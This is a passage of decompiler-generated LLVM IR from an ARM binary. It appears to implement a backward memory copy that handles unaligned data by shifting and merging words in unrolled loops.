  %v12_1a72c = add i32 %v11_1a72c, -1
  store i32 %v12_1a72c, i32* %r0.global-to-local, align 4
  br i1 %v9_1a71c, label %.thread13, label %bb155

bb155:                                            ; preds = %bb154
  %v8_1a730 = load i32, i32* %r1.global-to-local, align 4
  %v9_1a730 = add i32 %v8_1a730, -1
  %v10_1a730 = inttoptr i32 %v9_1a730 to i8*
  %v11_1a730 = load i8, i8* %v10_1a730, align 1
  %v12_1a730 = zext i8 %v11_1a730 to i32
  store i32 %v12_1a730, i32* @r3, align 4
  store i32 %v9_1a730, i32* %r1.global-to-local, align 4
  %v11_1a734 = add i32 %v11_1a72c, -2
  %v12_1a734 = inttoptr i32 %v11_1a734 to i8*
  store i8 %v11_1a730, i8* %v12_1a734, align 1
  %v13_1a734 = load i32, i32* %r0.global-to-local, align 4
  %v14_1a734 = add i32 %v13_1a734, -1
  store i32 %v14_1a734, i32* %r0.global-to-local, align 4
  br label %.thread13

.thread13:                                        ; preds = %bb154, %dec_label_pc_1a71c, %bb155
  %v0_1a79019 = phi i32 [ %v12_1a72c, %bb154 ], [ %v6_1a724, %dec_label_pc_1a71c ], [ %v14_1a734, %bb155 ]
  %v0_1a738 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a738 = load i32, i32* @ip, align 4
  %v2_1a738 = sub i32 %v0_1a738, %v1_1a738
  store i32 %v2_1a738, i32* %r2.global-to-local, align 4
  %v4_1a738 = xor i32 %v1_1a738, %v0_1a738
  %v5_1a738 = xor i32 %v2_1a738, %v0_1a738
  %v6_1a738 = and i32 %v5_1a738, %v4_1a738
  %v7_1a738 = icmp slt i32 %v6_1a738, 0
  store i1 %v7_1a738, i1* %cpsr_v.global-to-local, align 1
  %v8_1a738 = icmp slt i32 %v2_1a738, 0
  store i1 %v8_1a738, i1* %cpsr_n.global-to-local, align 1
  %v9_1a738 = icmp eq i32 %v0_1a738, %v1_1a738
  store i1 %v9_1a738, i1* %cpsr_z.global-to-local, align 1
  %v5_1a73c = icmp slt i32 %v0_1a738, %v1_1a738
  br i1 %v5_1a73c, label %bb150, label %dec_label_pc_1a740

dec_label_pc_1a740:                               ; preds = %.thread13
  %v0_1a740 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a740 = urem i32 %v0_1a740, 4
  store i32 %v1_1a740, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1a740 = icmp eq i32 %v1_1a740, 0
  store i1 %v2_1a740, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a740, label %dec_label_pc_1a684, label %dec_label_pc_1a748

dec_label_pc_1a748:                               ; preds = %dec_label_pc_1a67c, %dec_label_pc_1a740
  %v0_1a79018 = phi i32 [ %v2_1a668, %dec_label_pc_1a67c ], [ %v0_1a79019, %dec_label_pc_1a740 ]
  %v0_1a83c = phi i32 [ %v2_1a66c, %dec_label_pc_1a67c ], [ %v2_1a738, %dec_label_pc_1a740 ]
  %v0_1a748 = phi i32 [ %v2_1a664, %dec_label_pc_1a67c ], [ %v0_1a740, %dec_label_pc_1a740 ]
  %v0_1a750 = phi i32 [ %v1_1a67c, %dec_label_pc_1a67c ], [ %v1_1a740, %dec_label_pc_1a740 ]
  %v1_1a748 = and i32 %v0_1a748, -4
  store i32 %v1_1a748, i32* %r1.global-to-local, align 4
  %v1_1a74c = inttoptr i32 %v1_1a748 to i32*
  %v2_1a74c = load i32, i32* %v1_1a74c, align 4
  store i32 %v2_1a74c, i32* @r3, align 4
  %v7_1a750 = icmp ult i32 %v0_1a750, 2
  %v2_1a834 = add i32 %v0_1a83c, -12
  %v4_1a834 = sub i32 11, %v0_1a83c
  %v5_1a834 = and i32 %v4_1a834, %v0_1a83c
  %v6_1a834 = icmp slt i32 %v5_1a834, 0
  store i1 %v6_1a834, i1* %cpsr_v.global-to-local, align 1
  %v7_1a834 = icmp slt i32 %v2_1a834, 0
  store i1 %v7_1a834, i1* %cpsr_n.global-to-local, align 1
  %v8_1a834 = icmp eq i32 %v0_1a83c, 12
  store i1 %v8_1a834, i1* %cpsr_z.global-to-local, align 1
  %v5_1a838 = icmp slt i32 %v0_1a83c, 12
  br i1 %v7_1a750, label %dec_label_pc_1a834, label %dec_label_pc_1a758

dec_label_pc_1a758:                               ; preds = %dec_label_pc_1a748
  %v8_1a750 = icmp eq i32 %v0_1a750, 2
  br i1 %v8_1a750, label %dec_label_pc_1a7c8, label %dec_label_pc_1a75c

dec_label_pc_1a75c:                               ; preds = %dec_label_pc_1a758
  br i1 %v5_1a838, label %dec_label_pc_1a7a8, label %dec_label_pc_1a764

dec_label_pc_1a764:                               ; preds = %dec_label_pc_1a75c
  store i32 %v2_1a834, i32* %r2.global-to-local, align 4
  %v3_1a768 = load i32, i32* @r4, align 4
  store i32 %v3_1a768, i32* %stack_var_-12, align 4
  %v6_1a768 = load i32, i32* @r5, align 4
  %v8_1a768 = inttoptr i32 %v6_1a768 to i8*
  store i8* %v8_1a768, i8** %stack_var_-8, align 4
  %v11_1a768 = load i32, i32* @lr, align 4
  br label %dec_label_pc_1a76c

dec_label_pc_1a76c:                               ; preds = %dec_label_pc_1a76c.dec_label_pc_1a76c_crit_edge, %dec_label_pc_1a764
  %v0_1a790 = phi i32 [ %v1_1a790, %dec_label_pc_1a76c.dec_label_pc_1a76c_crit_edge ], [ %v0_1a79018, %dec_label_pc_1a764 ]
  %v0_1a770 = phi i32 [ %v0_1a770.pre, %dec_label_pc_1a76c.dec_label_pc_1a76c_crit_edge ], [ %v1_1a748, %dec_label_pc_1a764 ]
  %v0_1a76c = phi i32 [ %v0_1a76c.pre, %dec_label_pc_1a76c.dec_label_pc_1a76c_crit_edge ], [ %v2_1a74c, %dec_label_pc_1a764 ]
  %v3_1a76c = mul i32 %v0_1a76c, 256
  store i32 %v3_1a76c, i32* %lr.global-to-local, align 4
  %v1_1a770 = add i32 %v0_1a770, -4
  %v2_1a770 = inttoptr i32 %v1_1a770 to i32*
  %v3_1a770 = load i32, i32* %v2_1a770, align 4
  store i32 %v3_1a770, i32* @r3, align 4
  %v4_1a770 = add i32 %v0_1a770, -8
  %v5_1a770 = inttoptr i32 %v4_1a770 to i32*
  %v6_1a770 = load i32, i32* %v5_1a770, align 4
  store i32 %v6_1a770, i32* %r4.global-to-local, align 4
  %v7_1a770 = add i32 %v0_1a770, -12
  %v8_1a770 = inttoptr i32 %v7_1a770 to i32*
  %v9_1a770 = load i32, i32* %v8_1a770, align 4
  store i32 %v9_1a770, i32* %r5.global-to-local, align 4
  %v10_1a770 = add i32 %v0_1a770, -16
  %v11_1a770 = inttoptr i32 %v10_1a770 to i32*
  %v12_1a770 = load i32, i32* %v11_1a770, align 4
  store i32 %v10_1a770, i32* %r1.global-to-local, align 4
  %v4_1a774 = udiv i32 %v12_1a770, 16777216
  %v5_1a774 = or i32 %v4_1a774, %v3_1a76c
  store i32 %v5_1a774, i32* %lr.global-to-local, align 4
  %v3_1a778 = mul i32 %v12_1a770, 256
  %v4_1a77c = udiv i32 %v9_1a770, 16777216
  %v5_1a77c = or i32 %v3_1a778, %v4_1a77c
  store i32 %v5_1a77c, i32* @ip, align 4
  %v3_1a780 = mul i32 %v9_1a770, 256
  %v4_1a784 = udiv i32 %v6_1a770, 16777216
  %v5_1a784 = or i32 %v3_1a780, %v4_1a784
  store i32 %v5_1a784, i32* %r5.global-to-local, align 4
  %v3_1a788 = mul i32 %v6_1a770, 256
  %v4_1a78c = udiv i32 %v3_1a770, 16777216
  %v5_1a78c = or i32 %v3_1a788, %v4_1a78c
  store i32 %v5_1a78c, i32* %r4.global-to-local, align 4
  %v1_1a790 = add i32 %v0_1a790, -16
  %v2_1a790 = inttoptr i32 %v1_1a790 to i32*
  store i32 %v5_1a78c, i32* %v2_1a790, align 4
  %v4_1a790 = add i32 %v0_1a790, -12
  %v5_1a790 = inttoptr i32 %v4_1a790 to i32*
  %v6_1a790 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_1a790, i32* %v5_1a790, align 4
  %v7_1a790 = add i32 %v0_1a790, -8
  %v8_1a790 = inttoptr i32 %v7_1a790 to i32*
  %v9_1a790 = load i32, i32* @ip, align 4
  store i32 %v9_1a790, i32* %v8_1a790, align 4
  %v10_1a790 = add i32 %v0_1a790, -4
  %v11_1a790 = inttoptr i32 %v10_1a790 to i32*
  %v12_1a790 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_1a790, i32* %v11_1a790, align 4
  store i32 %v1_1a790, i32* %r0.global-to-local, align 4
  %v0_1a794 = load i32, i32* %r2.global-to-local, align 4
  %v2_1a794 = add i32 %v0_1a794, -16
  store i32 %v2_1a794, i32* %r2.global-to-local, align 4
  %v6_1a798 = icmp slt i32 %v0_1a794, 16
  br i1 %v6_1a798, label %dec_label_pc_1a79c, label %dec_label_pc_1a76c.dec_label_pc_1a76c_crit_edge

dec_label_pc_1a76c.dec_label_pc_1a76c_crit_edge:  ; preds = %dec_label_pc_1a76c
  %v0_1a76c.pre = load i32, i32* @r3, align 4
  %v0_1a770.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1a76c

dec_label_pc_1a79c:                               ; preds = %dec_label_pc_1a76c
  %v2_1a79c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1a79c, i32* @r4, align 4
  %v5_1a79c = load i8*, i8** %stack_var_-8, align 4
  %v6_1a79c = ptrtoint i8* %v5_1a79c to i32
  store i32 %v6_1a79c, i32* @r5, align 4
  store i32 %v11_1a768, i32* @lr, align 4
  %v2_1a7a0 = add i32 %v0_1a794, -4
  store i32 %v2_1a7a0, i32* %r2.global-to-local, align 4
  %v4_1a7a0 = add i32 %v0_1a794, 2147483632
  %v5_1a7a0 = and i32 %v2_1a7a0, %v4_1a7a0
  %v6_1a7a0 = icmp slt i32 %v5_1a7a0, 0
  store i1 %v6_1a7a0, i1* %cpsr_v.global-to-local, align 1
  %v7_1a7a0 = icmp slt i32 %v2_1a7a0, 0
  store i1 %v7_1a7a0, i1* %cpsr_n.global-to-local, align 1
  %v8_1a7a0 = icmp eq i32 %v2_1a7a0, 0
  store i1 %v8_1a7a0, i1* %cpsr_z.global-to-local, align 1
  %v5_1a7a4 = icmp slt i32 %v2_1a794, -12
  br i1 %v5_1a7a4, label %dec_label_pc_1a7c0, label %dec_label_pc_1a7a8

dec_label_pc_1a7a8:                               ; preds = %dec_label_pc_1a79c, %dec_label_pc_1a75c, %dec_label_pc_1a7a8
  %v1_1a7b4 = phi i32 [ %v5_1a7b4, %dec_label_pc_1a7a8 ], [ %v1_1a790, %dec_label_pc_1a79c ], [ %v0_1a79018, %dec_label_pc_1a75c ]
  %v0_1a7a8 = load i32, i32* @r3, align 4
  %v3_1a7a8 = mul i32 %v0_1a7a8, 256
  store i32 %v3_1a7a8, i32* %ip.global-to-local, align 4
  %v0_1a7ac = load i32, i32* %r1.global-to-local, align 4
  %v1_1a7ac = add i32 %v0_1a7ac, -4
  %v2_1a7ac = inttoptr i32 %v1_1a7ac to i32*
  %v3_1a7ac = load i32, i32* %v2_1a7ac, align 4
  store i32 %v3_1a7ac, i32* @r3, align 4
  store i32 %v1_1a7ac, i32* %r1.global-to-local, align 4
  %v4_1a7b0 = udiv i32 %v3_1a7ac, 16777216
  %v5_1a7b0 = or i32 %v4_1a7b0, %v3_1a7a8
  store i32 %v5_1a7b0, i32* @ip, align 4
  %v2_1a7b4 = add i32 %v1_1a7b4, -4
  %v3_1a7b4 = inttoptr i32 %v2_1a7b4 to i32*
  store i32 %v5_1a7b0, i32* %v3_1a7b4, align 4
  %v4_1a7b4 = load i32, i32* %r0.global-to-local, align 4
  %v5_1a7b4 = add i32 %v4_1a7b4, -4
  store i32 %v5_1a7b4, i32* %r0.global-to-local, align 4
  %v0_1a7b8 = load i32, i32* %r2.global-to-local, align 4
  %v2_1a7b8 = add i32 %v0_1a7b8, -4
  store i32 %v2_1a7b8, i32* %r2.global-to-local, align 4
  %v6_1a7bc = icmp slt i32 %v0_1a7b8, 4
  br i1 %v6_1a7bc, label %dec_label_pc_1a7c0.loopexit, label %dec_label_pc_1a7a8

dec_label_pc_1a7c0.loopexit:                      ; preds = %dec_label_pc_1a7a8
  %v4_1a7b8 = sub i32 3, %v0_1a7b8
  %v5_1a7b8 = and i32 %v4_1a7b8, %v0_1a7b8
  %v6_1a7b8 = icmp slt i32 %v5_1a7b8, 0
  %v7_1a7b8 = icmp slt i32 %v2_1a7b8, 0
  store i1 %v6_1a7b8, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_1a7b8, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1a7c0

dec_label_pc_1a7c0:                               ; preds = %dec_label_pc_1a7c0.loopexit, %dec_label_pc_1a79c
  %v2_1a70450 = phi i32 [ %v5_1a7b4, %dec_label_pc_1a7c0.loopexit ], [ %v1_1a790, %dec_label_pc_1a79c ]
  %v0_1a6f446 = phi i32 [ %v2_1a7b8, %dec_label_pc_1a7c0.loopexit ], [ %v2_1a7a0, %dec_label_pc_1a79c ]
  %v0_1a7c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a7c0 = add i32 %v0_1a7c0, 3
  store i32 %v1_1a7c0, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_1a7c8:                               ; preds = %dec_label_pc_1a758
  br i1 %v5_1a838, label %dec_label_pc_1a814, label %dec_label_pc_1a7d0

dec_label_pc_1a7d0:                               ; preds = %dec_label_pc_1a7c8
  store i32 %v2_1a834, i32* %r2.global-to-local, align 4
  %v3_1a7d4 = load i32, i32* @r4, align 4
  store i32 %v3_1a7d4, i32* %stack_var_-12, align 4
  %v6_1a7d4 = load i32, i32* @r5, align 4
  %v8_1a7d4 = inttoptr i32 %v6_1a7d4 to i8*
  store i8* %v8_1a7d4, i8** %stack_var_-8, align 4
  %v11_1a7d4 = load i32, i32* @lr, align 4
  br label %dec_label_pc_1a7d8

dec_label_pc_1a7d8:                               ; preds = %dec_label_pc_1a7d8.dec_label_pc_1a7d8_crit_edge, %dec_label_pc_1a7d0
  %v0_1a7fc = phi i32 [ %v1_1a7fc, %dec_label_pc_1a7d8.dec_label_pc_1a7d8_crit_edge ], [ %v0_1a79018, %dec_label_pc_1a7d0 ]
  %v0_1a7dc = phi i32 [ %v0_1a7dc.pre, %dec_label_pc_1a7d8.dec_label_pc_1a7d8_crit_edge ], [ %v1_1a748, %dec_label_pc_1a7d0 ]
  %v0_1a7d8 = phi i32 [ %v0_1a7d8.pre, %dec_label_pc_1a7d8.dec_label_pc_1a7d8_crit_edge ], [ %v2_1a74c, %dec_label_pc_1a7d0 ]
  %v3_1a7d8 = mul i32 %v0_1a7d8, 65536
  store i32 %v3_1a7d8, i32* %lr.global-to-local, align 4
  %v1_1a7dc = add i32 %v0_1a7dc, -4
  %v2_1a7dc = inttoptr i32 %v1_1a7dc to i32*
  %v3_1a7dc = load i32, i32* %v2_1a7dc, align 4
  store i32 %v3_1a7dc, i32* @r3, align 4
  %v4_1a7dc = add i32 %v0_1a7dc, -8
  %v5_1a7dc = inttoptr i32 %v4_1a7dc to i32*
  %v6_1a7dc = load i32, i32* %v5_1a7dc, align 4
  store i32 %v6_1a7dc, i32* %r4.global-to-local, align 4
  %v7_1a7dc = add i32 %v0_1a7dc, -12
  %v8_1a7dc = inttoptr i32 %v7_1a7dc to i32*
  %v9_1a7dc = load i32, i32* %v8_1a7dc, align 4
  store i32 %v9_1a7dc, i32* %r5.global-to-local, align 4
  %v10_1a7dc = add i32 %v0_1a7dc, -16
  %v11_1a7dc = inttoptr i32 %v10_1a7dc to i32*
  %v12_1a7dc = load i32, i32* %v11_1a7dc, align 4
  store i32 %v10_1a7dc, i32* %r1.global-to-local, align 4
  %v4_1a7e0 = udiv i32 %v12_1a7dc, 65536
  %v5_1a7e0 = or i32 %v4_1a7e0, %v3_1a7d8
  store i32 %v5_1a7e0, i32* %lr.global-to-local, align 4
  %v3_1a7e4 = mul i32 %v12_1a7dc, 65536
  %v4_1a7e8 = udiv i32 %v9_1a7dc, 65536
  %v5_1a7e8 = or i32 %v3_1a7e4, %v4_1a7e8
  store i32 %v5_1a7e8, i32* @ip, align 4
  %v3_1a7ec = mul i32 %v9_1a7dc, 65536
  %v4_1a7f0 = udiv i32 %v6_1a7dc, 65536
  %v5_1a7f0 = or i32 %v3_1a7ec, %v4_1a7f0
  store i32 %v5_1a7f0, i32* %r5.global-to-local, align 4
  %v3_1a7f4 = mul i32 %v6_1a7dc, 65536
  %v4_1a7f8 = udiv i32 %v3_1a7dc, 65536
  %v5_1a7f8 = or i32 %v3_1a7f4, %v4_1a7f8
  store i32 %v5_1a7f8, i32* %r4.global-to-local, align 4
  %v1_1a7fc = add i32 %v0_1a7fc, -16
  %v2_1a7fc = inttoptr i32 %v1_1a7fc to i32*
  store i32 %v5_1a7f8, i32* %v2_1a7fc, align 4
  %v4_1a7fc = add i32 %v0_1a7fc, -12
  %v5_1a7fc = inttoptr i32 %v4_1a7fc to i32*
  %v6_1a7fc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_1a7fc, i32* %v5_1a7fc, align 4
  %v7_1a7fc = add i32 %v0_1a7fc, -8
  %v8_1a7fc = inttoptr i32 %v7_1a7fc to i32*
  %v9_1a7fc = load i32, i32* @ip, align 4
  store i32 %v9_1a7fc, i32* %v8_1a7fc, align 4
  %v10_1a7fc = add i32 %v0_1a7fc, -4
  %v11_1a7fc = inttoptr i32 %v10_1a7fc to i32*
  %v12_1a7fc = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_1a7fc, i32* %v11_1a7fc, align 4
  store i32 %v1_1a7fc, i32* %r0.global-to-local, align 4
  %v0_1a800 = load i32, i32* %r2.global-to-local, align 4
  %v2_1a800 = add i32 %v0_1a800, -16
  store i32 %v2_1a800, i32* %r2.global-to-local, align 4
  %v6_1a804 = icmp slt i32 %v0_1a800, 16
  br i1 %v6_1a804, label %dec_label_pc_1a808, label %dec_label_pc_1a7d8.dec_label_pc_1a7d8_crit_edge

dec_label_pc_1a7d8.dec_label_pc_1a7d8_crit_edge:  ; preds = %dec_label_pc_1a7d8
  %v0_1a7d8.pre = load i32, i32* @r3, align 4
  %v0_1a7dc.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1a7d8

dec_label_pc_1a808:                               ; preds = %dec_label_pc_1a7d8
  %v2_1a808 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1a808, i32* @r4, align 4
  %v5_1a808 = load i8*, i8** %stack_var_-8, align 4
  %v6_1a808 = ptrtoint i8* %v5_1a808 to i32
  store i32 %v6_1a808, i32* @r5, align 4
  store i32 %v11_1a7d4, i32* @lr, align 4
  %v2_1a80c = add i32 %v0_1a800, -4
  store i32 %v2_1a80c, i32* %r2.global-to-local, align 4
  %v4_1a80c = add i32 %v0_1a800, 2147483632
  %v5_1a80c = and i32 %v2_1a80c, %v4_1a80c
  %v6_1a80c = icmp slt i32 %v5_1a80c, 0
  store i1 %v6_1a80c, i1* %cpsr_v.global-to-local, align 1
  %v7_1a80c = icmp slt i32 %v2_1a80c, 0
  store i1 %v7_1a80c, i1* %cpsr_n.global-to-local, align 1
  %v8_1a80c = icmp eq i32 %v2_1a80c, 0
  store i1 %v8_1a80c, i1* %cpsr_z.global-to-local, align 1
  %v5_1a810 = icmp slt i32 %v2_1a800, -12
  br i1 %v5_1a810, label %dec_label_pc_1a82c, label %dec_label_pc_1a814

dec_label_pc_1a814:                               ; preds = %dec_label_pc_1a808, %dec_label_pc_1a7c8, %dec_label_pc_1a814
  %v1_1a820 = phi i32 [ %v5_1a820, %dec_label_pc_1a814 ], [ %v1_1a7fc, %dec_label_pc_1a808 ], [ %v0_1a79018, %dec_label_pc_1a7c8 ]
  %v0_1a814 = load i32, i32* @r3, align 4
  %v3_1a814 = mul i32 %v0_1a814, 65536
  store i32 %v3_1a814, i32* %ip.global-to-local, align 4
  %v0_1a818 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a818 = add i32 %v0_1a818, -4
  %v2_1a818 = inttoptr i32 %v1_1a818 to i32*
  %v3_1a818 = load i32, i32* %v2_1a818, align 4
  store i32 %v3_1a818, i32* @r3, align 4
  store i32 %v1_1a818, i32* %r1.global-to-local, align 4
  %v4_1a81c = udiv i32 %v3_1a818, 65536
  %v5_1a81c = or i32 %v4_1a81c, %v3_1a814
  store i32 %v5_1a81c, i32* @ip, align 4
  %v2_1a820 = add i32 %v1_1a820, -4
  %v3_1a820 = inttoptr i32 %v2_1a820 to i32*
  store i32 %v5_1a81c, i32* %v3_1a820, align 4
  %v4_1a820 = load i32, i32* %r0.global-to-local, align 4
  %v5_1a820 = add i32 %v4_1a820, -4
  store i32 %v5_1a820, i32* %r0.global-to-local, align 4
  %v0_1a824 = load i32, i32* %r2.global-to-local, align 4
  %v2_1a824 = add i32 %v0_1a824, -4
  store i32 %v2_1a824, i32* %r2.global-to-local, align 4
  %v6_1a828 = icmp slt i32 %v0_1a824, 4
  br i1 %v6_1a828, label %dec_label_pc_1a82c.loopexit, label %dec_label_pc_1a814

dec_label_pc_1a82c.loopexit:                      ; preds = %dec_label_pc_1a814
  %v4_1a824 = sub i32 3, %v0_1a824
  %v5_1a824 = and i32 %v4_1a824, %v0_1a824
  %v6_1a824 = icmp slt i32 %v5_1a824, 0
  %v7_1a824 = icmp slt i32 %v2_1a824, 0
  store i1 %v6_1a824, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_1a824, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1a82c

dec_label_pc_1a82c:                               ; preds = %dec_label_pc_1a82c.loopexit, %dec_label_pc_1a808
  %v2_1a70451 = phi i32 [ %v5_1a820, %dec_label_pc_1a82c.loopexit ], [ %v1_1a7fc, %dec_label_pc_1a808 ]
  %v0_1a6f447 = phi i32 [ %v2_1a824, %dec_label_pc_1a82c.loopexit ], [ %v2_1a80c, %dec_label_pc_1a808 ]
  %v0_1a82c = load i32, i32* %r1.global-to-local, align 4
  %v1_1a82c = add i32 %v0_1a82c, 2
  store i32 %v1_1a82c, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_1a834:                               ; preds = %dec_label_pc_1a748
  br i1 %v5_1a838, label %dec_label_pc_1a880, label %dec_label_pc_1a83c

dec_label_pc_1a83c:                               ; preds = %dec_label_pc_1a834
  store i32 %v2_1a834, i32* %r2.global-to-local, align 4
  %v3_1a840 = load i32, i32* @r4, align 4
  store i32 %v3_1a840, i32* %stack_var_-12, align 4
  %v6_1a840 = load i32, i32* @r5, align 4
  %v8_1a840 = inttoptr i32 %v6_1a840 to i8*
  store i8* %v8_1a840, i8** %stack_var_-8, align 4
  %v11_1a840 = load i32, i32* @lr, align 4
  br label %dec_label_pc_1a844

dec_label_pc_1a844:                               ; preds = %dec_label_pc_1a844.dec_label_pc_1a844_crit_edge, %dec_label_pc_1a83c
  %v0_1a868 = phi i32 [ %v1_1a868, %dec_label_pc_1a844.dec_label_pc_1a844_crit_edge ], [ %v0_1a79018, %dec_label_pc_1a83c ]
  %v0_1a848 = phi i32 [ %v0_1a848.pre, %dec_label_pc_1a844.dec_label_pc_1a844_crit_edge ], [ %v1_1a748, %dec_label_pc_1a83c ]
  %v0_1a844 = phi i32 [ %v0_1a844.pre, %dec_label_pc_1a844.dec_label_pc_1a844_crit_edge ], [ %v2_1a74c, %dec_label_pc_1a83c ]
  %v3_1a844 = mul i32 %v0_1a844, 16777216
  store i32 %v3_1a844, i32* %lr.global-to-local, align 4
  %v1_1a848 = add i32 %v0_1a848, -4
  %v2_1a848 = inttoptr i32 %v1_1a848 to i32*
  %v3_1a848 = load i32, i32* %v2_1a848, align 4
  store i32 %v3_1a848, i32* @r3, align 4
  %v4_1a848 = add i32 %v0_1a848, -8
  %v5_1a848 = inttoptr i32 %v4_1a848 to i32*
  %v6_1a848 = load i32, i32* %v5_1a848, align 4
  store i32 %v6_1a848, i32* %r4.global-to-local, align 4
  %v7_1a848 = add i32 %v0_1a848, -12
  %v8_1a848 = inttoptr i32 %v7_1a848 to i32*
  %v9_1a848 = load i32, i32* %v8_1a848, align 4
  store i32 %v9_1a848, i32* %r5.global-to-local, align 4
  %v10_1a848 = add i32 %v0_1a848, -16
  %v11_1a848 = inttoptr i32 %v10_1a848 to i32*
  %v12_1a848 = load i32, i32* %v11_1a848, align 4
  store i32 %v10_1a848, i32* %r1.global-to-local, align 4
  %v4_1a84c = udiv i32 %v12_1a848, 256
  %v5_1a84c = or i32 %v4_1a84c, %v3_1a844
  store i32 %v5_1a84c, i32* %lr.global-to-local, align 4
  %v3_1a850 = mul i32 %v12_1a848, 16777216
  %v4_1a854 = udiv i32 %v9_1a848, 256
  %v5_1a854 = or i32 %v3_1a850, %v4_1a854
  store i32 %v5_1a854, i32* @ip, align 4
  %v3_1a858 = mul i32 %v9_1a848, 16777216
  %v4_1a85c = udiv i32 %v6_1a848, 256
  %v5_1a85c = or i32 %v3_1a858, %v4_1a85c
  store i32 %v5_1a85c, i32* %r5.global-to-local, align 4
  %v3_1a860 = mul i32 %v6_1a848, 16777216
  %v4_1a864 = udiv i32 %v3_1a848, 256
  %v5_1a864 = or i32 %v3_1a860, %v4_1a864
  store i32 %v5_1a864, i32* %r4.global-to-local, align 4
  %v1_1a868 = add i32 %v0_1a868, -16
  %v2_1a868 = inttoptr i32 %v1_1a868 to i32*
  store i32 %v5_1a864, i32* %v2_1a868, align 4
  %v4_1a868 = add i32 %v0_1a868, -12
  %v5_1a868 = inttoptr i32 %v4_1a868 to i32*
  %v6_1a868 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_1a868, i32* %v5_1a868, align 4
  %v7_1a868 = add i32 %v0_1a868, -8
  %v8_1a868 = inttoptr i32 %v7_1a868 to i32*
  %v9_1a868 = load i32, i32* @ip, align 4
  store i32 %v9_1a868, i32* %v8_1a868, align 4
  %v10_1a868 = add i32 %v0_1a868, -4
  %v11_1a868 = inttoptr i32 %v10_1a868 to i32*
  %v12_1a868 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_1a868, i32* %v11_1a868, align 4
  store i32 %v1_1a868, i32* %r0.global-to-local, align 4
  %v0_1a86c = load i32, i32* %r2.global-to-local, align 4
  %v2_1a86c = add i32 %v0_1a86c, -16
  store i32 %v2_1a86c, i32* %r2.global-to-local, align 4
  %v6_1a870 = icmp slt i32 %v0_1a86c, 16
  br i1 %v6_1a870, label %dec_label_pc_1a874, label %dec_label_pc_1a844.dec_label_pc_1a844_crit_edge

dec_label_pc_1a844.dec_label_pc_1a844_crit_edge:  ; preds = %dec_label_pc_1a844
  %v0_1a844.pre = load i32, i32* @r3, align 4
  %v0_1a848.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1a844

dec_label_pc_1a874:                               ; preds = %dec_label_pc_1a844
  %v2_1a874 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1a874, i32* @r4, align 4
  %v5_1a874 = load i8*, i8** %stack_var_-8, align 4
  %v6_1a874 = ptrtoint i8* %v5_1a874 to i32
  store i32 %v6_1a874, i32* @r5, align 4
  store i32 %v11_1a840, i32* @lr, align 4
  %v2_1a878 = add i32 %v0_1a86c, -4
  store i32 %v2_1a878, i32* %r2.global-to-local, align 4
  %v4_1a878 = add i32 %v0_1a86c, 2147483632
  %v5_1a878 = and i32 %v2_1a878, %v4_1a878
  %v6_1a878 = icmp slt i32 %v5_1a878, 0
  store i1 %v6_1a878, i1* %cpsr_v.global-to-local, align 1
  %v7_1a878 = icmp slt i32 %v2_1a878, 0
  store i1 %v7_1a878, i1* %cpsr_n.global-to-local, align 1
  %v8_1a878 = icmp eq i32 %v2_1a878, 0
  store i1 %v8_1a878, i1* %cpsr_z.global-to-local, align 1
  %v5_1a87c = icmp slt i32 %v2_1a86c, -12
  br i1 %v5_1a87c, label %dec_label_pc_1a898, label %dec_label_pc_1a880

dec_label_pc_1a880:                               ; preds = %dec_label_pc_1a874, %dec_label_pc_1a834, %dec_label_pc_1a880
  %v1_1a88c = phi i32 [ %v5_1a88c, %dec_label_pc_1a880 ], [ %v1_1a868, %dec_label_pc_1a874 ], [ %v0_1a79018, %dec_label_pc_1a834 ]
  %v0_1a880 = load i32, i32* @r3, align 4
  %v3_1a880 = mul i32 %v0_1a880, 16777216
  store i32 %v3_1a880, i32* %ip.global-to-local, align 4
  %v0_1a884 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a884 = add i32 %v0_1a884, -4
  %v2_1a884 = inttoptr i32 %v1_1a884 to i32*
  %v3_1a884 = load i32, i32* %v2_1a884, align 4
  store i32 %v3_1a884, i32* @r3, align 4
  store i32 %v1_1a884, i32* %r1.global-to-local, align 4
  %v4_1a888 = udiv i32 %v3_1a884, 256
  %v5_1a888 = or i32 %v4_1a888, %v3_1a880
  store i32 %v5_1a888, i32* @ip, align 4
  %v2_1a88c = add i32 %v1_1a88c, -4
  %v3_1a88c = inttoptr i32 %v2_1a88c to i32*
  store i32 %v5_1a888, i32* %v3_1a88c, align 4
  %v4_1a88c = load i32, i32* %r0.global-to-local, align 4
  %v5_1a88c = add i32 %v4_1a88c, -4
  store i32 %v5_1a88c, i32* %r0.global-to-local, align 4
  %v0_1a890 = load i32, i32* %r2.global-to-local, align 4
  %v2_1a890 = add i32 %v0_1a890, -4
  store i32 %v2_1a890, i32* %r2.global-to-local, align 4
  %v6_1a894 = icmp slt i32 %v0_1a890, 4
  br i1 %v6_1a894, label %dec_label_pc_1a898.loopexit, label %dec_label_pc_1a880

dec_label_pc_1a898.loopexit:                      ; preds = %dec_label_pc_1a880
  %v4_1a890 = sub i32 3, %v0_1a890
